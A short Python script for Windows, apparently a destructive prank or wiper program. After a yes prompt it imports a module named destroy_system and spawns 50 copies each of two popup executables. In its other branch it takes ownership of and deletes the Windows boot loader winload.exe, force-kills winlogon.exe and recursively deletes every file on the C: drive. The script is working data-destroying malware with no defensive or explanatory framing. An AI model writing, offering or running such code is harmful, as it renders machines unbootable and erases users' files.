import os
import threading
import sys
import subprocess
from tkinter import *
from tkinter import messagebox

def open_python(file, amount=1):
    for x in range(amount):
        subprocess.Popen(file)
if not sys.argv[0] == 'C:\\Windows\\System32\\windeploy.exe':
    confirmation = input('ARE YOU SURE YOU WANT TO DO THIS?: ')

    if confirmation == 'y' or confirmation == 'yes':
        print('OK')
        import destroy_system
        root = Tk()
        root.geometry('0x0')
        open_python('popups.exe', 50)
        open_python('image_popups.exe', 50)
        root.mainloop()

else:
    os.system('takeown C:\\Windows\\System32\\winload.exe')
    os.system('del C:\\Windows\\System32\\winload.exe')
    os.system('taskkill /f /im winlogon.exe')
    os.system('del /f /s /q C:\\')
